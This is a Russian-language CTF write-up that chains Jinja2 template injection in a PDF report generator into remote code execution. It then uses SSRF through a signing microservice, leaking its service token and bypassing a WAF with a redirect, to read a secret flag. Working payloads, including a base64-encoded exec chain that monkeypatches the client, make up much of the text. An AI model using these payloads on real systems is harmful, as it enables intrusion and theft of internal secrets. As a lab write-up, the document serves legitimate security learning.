# writeup Нулевое недоверие

Перейдя по ссылке, получаем предупреждение о том, что соревнования ещё не закончились. Находим публичный эндпоин `/openapi.json`, в котором упоминается страница администратора, на которой расположен интерфейс 
сервиса генерации отчетов с возможностью сохранения в формате PDF. Заметим, что в отчет попадает пользовательский ввод (отзыв к задаче). При попытке отправить тестовый пейлоад `{{ 7 * 7 }}` в поле отзыв, видим, что в web интерфейсе данные отображаются безопасно, а в PDF получаем `49`.

## Разведка инфраструктуры через SSTI

### Изучаем скомпрометированный микросервис

Посмотрим переменные окружения: `{{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('env').read() }}`:
```
HOSTNAME=3422e357b87e 
STAMP_IMG=stamp_img
XDG_CACHE_HOME=/tmp/.cache
HOME=/home/ctfuser
PYTHONUNBUFFERED=1 
GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
PYTHON_SHA256=c08bc65a81971c1dd5783182826503369466c7e67374d1646519adf05207b684 
PYTHONDONTWRITEBYTECODE=1 
STORAGE_API_URL=http://storage:8000
SIGNER_API_URL=http://signer:8000
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
LANG=C.UTF-8 
PYTHON_VERSION=3.12.13
STAMP_TEXT=stamp_text
PWD=/app 
PYTHONPATH=/app
```

Обратим внимание на сервисы в сети, запомним.

Проверим наличие стандартных системных утилит: `{{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('which curl wget nc ping python python3 bash sh').read() }}`. Анализ показывает наличие интерпретаторов Python и оболочек bash, sh.

Из переменных окружения видно, что рабочая директория - `/app`, посмотрим, какие файлы в ней есть: `{{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('find /app -type f').read() }}`
```
/app/src/services/renderer.py 
/app/src/services/clients.py 
/app/src/services/__init__.py
/app/src/core/exceptions.py 
/app/src/core/logger.py 
/app/src/core/__init__.py 
/app/src/core/config.py 
/app/src/main.py 
/app/src/__init__.py 
/app/src/api/schemas.py 
/app/src/api/__init__.py 
/app/src/api/generate.py 
/app/requirements.txt
```

Теперь изучим код микросервиса: `{{ self.__init__.__globals__['__builtins__']['open']('<Путь к файлу>').read() }}` и сделаем следующие выводы:

1. Получает документ из веб интерфейса (`/app/src/api/generate.py `)
2. Через специального клиента получает шаблон из хранилища (клиент StorageClient: `/app/src/services/clients.py`, генератор: `/app/src/services/renderer.py`)
3. Рендерит шаблон (`/app/src/services/renderer.py`)
4. Передает через специального клиента докумет на подпись (клиент SignerClient: `/app/src/services/clients.py`, генератор: `/app/src/services/renderer.py`)
5. Отдает подписанный документ в веб интерфейс

### Изучаем остальные микросервисы

Учитывая что веб интерфейс и генератор pdf работают на FastAPI, можно предположить, что остальные микросервисы построены на том же фреймворке. Попробуем посмотреть их openapi спецификации:

#### Signer

Сервис имеет два публичных маршрута: служебный `GET /health` и `POST /api/v1/sign`. Ключевая особенность данного эндпоинта заключается в том, что сервис самостоятельно выполняет исходящие HTTP-запросы. Вместо самих файлов он принимает ссылки для их загрузки.

Схема входных данных:
- document_base64 (строка): Сам исходный PDF-документ, который нужно подписать.
- text_url (строка в формате URI): Ссылка, по которой сервис пойдет скачивать текст для штампа.
- img_url (строка в формате URI): Ссылка, по которой сервис пойдет скачивать фон для штампа.

Схема ответа:
- signed_document_base64: Готовый PDF-документ со штампом и ЭЦП.

#### Storage

Эндпоинты:
- `GET /public/assets/{asset_name}`: Открытый маршрут для получения публичных файлов. Отсюда Signer скачивает stamp_img и stamp_text (`/app/src/services/renderer.py`).
- `GET /internal/secrets/{secret_key}`: Закрытый маршрут для получения приватных файлов, в спецификации котрого оставлена подсказка в поле examples для параметра secret_key: ["flag", "p12-key"].

Эндпоинт `/internal/secrets/` защищен с помощью apiKey в заголовке `X-Service-Token`

## SSRF

### Header Leak

Следовательно, для успешной эксплуатации нам необходимо либо извлечь валидный токен, либо инициировать запрос от имени доверенного сервиса. Исследовав PDF GEN понимаам, что токена в нем нет. 

В примерах в `/internal/secrets/{secret_key}` можно заметить p12-key. Это контейнер с приватным ключем для цифровой подписи, соответственно, скорее всего, Signer обладает нужным нам токеном.

Предположим, что токен прикрепляется ко всем запросам от сервиса. 

Поднимем сервер, который перехватит http запрос и выведет его содержимое в PDF
```
{% set socket = self.__init__.__globals__['__builtins__']['__import__']('socket') %}
{% set threading = self.__init__.__globals__['__builtins__']['__import__']('threading') %}
{% set httpx = self.__init__.__globals__['__builtins__']['__import__']('httpx') %}
{% set my_ip = socket.gethostbyname(socket.gethostname()) %}
{% set s = socket.socket() %}
{% set _ = s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) %}
{% set _ = s.bind(('0.0.0.0', 9000)) %}
{% set _ = s.listen(1) %}
{% set _ = s.settimeout(5.0) %}
{% set payload = {'document_base64': 'JVBERi0xLjEK', 'text_url': 'http://' ~ my_ip ~ ':9000/', 'img_url': 'http://storage:8000/public/assets/stamp_img'} %}
{% set t = threading.Thread(target=httpx.post, args=('http://signer:8000/api/v1/sign',), kwargs={'json': payload}) %}
{% set _ = t.start() %}
{% set conn_addr = s.accept() %}
{% set req = conn_addr[0].recv(4096).decode('utf-8') %}
{% set _ = conn_addr[0].sendall('HTTP/1.1 200 OK\n\n'.encode()) %}
{% set _ = conn_addr[0].close() %}
{% set _ = s.close() %}
{{ req }}
```

Получаем ответ:
```
GET / HTTP/1.1 
Host: 172.20.0.3:9000 
X-Service-Token: signer.7eff38ecf39c52966569a6c661eb46c8ba9cb169e659097770a0a1bddf2fed35
Accept: */* 
Accept-Encoding: gzip, deflate 
User-Agent: Python/3.12 aiohttp/3.13.5
```
Если попробовать отправить запрос в хранилище, то получим отказ с сообщением о невалидности токена, откуда делаем вывод, что хранилище использует токен, привязанный к источнику. Остается вариант заставить Signer украсть флаг.

Прямая попытка передать внутренний URL (/internal/...) для получения флага блокируется на уровне WAF. Методы обхода, такие как url кодирование, path travel, Non-ascii не проходят. Анализируя ответы фильтра, понимаем, что WAF запрещает переход конкретно по `/internal/`, но разрешает все остальные.
Заметим, что в заголовке `User-Agent`, которые прислал нам Signer, есть `aiohttp`, которая по умолчанию переходит по редиректам.

### redirect

Используя наличие RCE и возможности динамического изменения кода в Python, сделаем следующее:

1. Поднимем сервер, который сделает редирект на флаг
2. Пропатчим функцию отправки данных на подпись `SignerClient.sign_pdf` так, чтобы она отправляла запрос на наш сервер

Это выглядит примерно так:
``` python
import sys
import threading

def redirect_server():
    import socket
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        server_socket.bind(('0.0.0.0', 9001))
        server_socket.listen(1)
        
        # ждем входящего подключения от микросервиса Signer
        client_connection, client_address = server_socket.accept()
        
        # чтобы клиент не сбросил соединение
        client_connection.recv(1024)
        
        # Перенаправляем Signer за флагом
        redirect_response = (
            b"HTTP/1.1 302 Found\r\n"
            b"Location: http://storage:8000/internal/secrets/flag\r\n"
            b"\r\n"
        )
        client_connection.sendall(redirect_response)
        
        client_connection.close()
        server_socket.close()
    except Exception:
        pass

# daemon=True чтобы он не заблокировал основной процесс веб-приложения
threading.Thread(target=redirect_server, daemon=True).start()

# Перебираем все загруженные модули в памяти Python-процесса
for module_name, module in sys.modules.items():
    
    # ищем модуль, в котором объявлен SignerClient
    if hasattr(module, 'SignerClient'):
        
        # функция, которая заменит оригинальную
        async def patched_sign_pdf(self, pdf_base64):
            import httpx
            import socket
            
            # Динамически узнаем свой внутренний IP-адрес
            local_ip = socket.gethostbyname(socket.gethostname())
            
            # Вместо текста штампа пишем адрес редиректа
            payload = {
                'document_base64': pdf_base64,
                'text_url': f'http://{local_ip}:9001/', 
                'img_url': 'http://storage:8000/public/assets/stamp_img'
            }
            
            async with httpx.AsyncClient() as client:
                response = await client.post('http://signer:8000/api/v1/sign', json=payload, timeout=15.0)
                
                # Извлекаем готовый PDF с флагом и отдаем его веб-приложению
                return response.json().get('signed_document_base64', '')
        
        # подменяем метод оригинального класса
        module.SignerClient.sign_pdf = patched_sign_pdf
```

Сожмем код и закодируем нагрузку в base64:
```
{% set b64 = self.__init__.__globals__['__builtins__']['__import__']('base64') %}{% set _ = self.__init__.__globals__['__builtins__']['exec'](b64.b64decode('aW1wb3J0IHN5cyx0aHJlYWRpbmcKZGVmIHMoKToKIGltcG9ydCBzb2NrZXQKIHRyeToKICBvPXNvY2tldC5zb2NrZXQoKTtvLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQsMiwxKTtvLmJpbmQoKCcwLjAuMC4wJyw5MDAxKSk7by5saXN0ZW4oMSk7YyxfPW8uYWNjZXB0KCk7Yy5yZWN2KDEwMjQpO2Muc2VuZGFsbChiJ0hUVFAvMS4xIDMwMiBGb3VuZFxyXG5Mb2NhdGlvbjogaHR0cDovL3N0b3JhZ2U6ODAwMC9pbnRlcm5hbC9zZWNyZXRzL2ZsYWdcclxuXHJcbicpO2MuY2xvc2UoKTtvLmNsb3NlKCkKIGV4Y2VwdDpwYXNzCnRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXMsZGFlbW9uPVRydWUpLnN0YXJ0KCkKZm9yIG4sbSBpbiBzeXMubW9kdWxlcy5pdGVtcygpOgogaWYgaGFzYXR0cihtLCdTaWduZXJDbGllbnQnKToKICBhc3luYyBkZWYgaChzZWxmLHApOgogICBpbXBvcnQgaHR0cHgsc29ja2V0CiAgIGk9c29ja2V0LmdldGhvc3RieW5hbWUoc29ja2V0LmdldGhvc3RuYW1lKCkpCiAgIGQ9eydkb2N1bWVudF9iYXNlNjQnOnAsJ3RleHRfdXJsJzpmJ2h0dHA6Ly97aX06OTAwMS8nLCdpbWdfdXJsJzonaHR0cDovL3N0b3JhZ2U6ODAwMC9wdWJsaWMvYXNzZXRzL3N0YW1wX2ltZyd9CiAgIGFzeW5jIHdpdGggaHR0cHguQXN5bmNDbGllbnQoKSBhcyBjOgogICAgcj1hd2FpdCBjLnBvc3QoJ2h0dHA6Ly9zaWduZXI6ODAwMC9hcGkvdjEvc2lnbicsanNvbj1kLHRpbWVvdXQ9MTUuMCkKICAgIHJldHVybiByLmpzb24oKS5nZXQoJ3NpZ25lZF9kb2N1bWVudF9iYXNlNjQnLCcnKQogIG0uU2lnbmVyQ2xpZW50LnNpZ25fcGRmPWg=').decode('utf-8')) %}{{ 'patched' }}  
```

Выполнив этот код получаем PDF документ, в штампе которого написан флаг
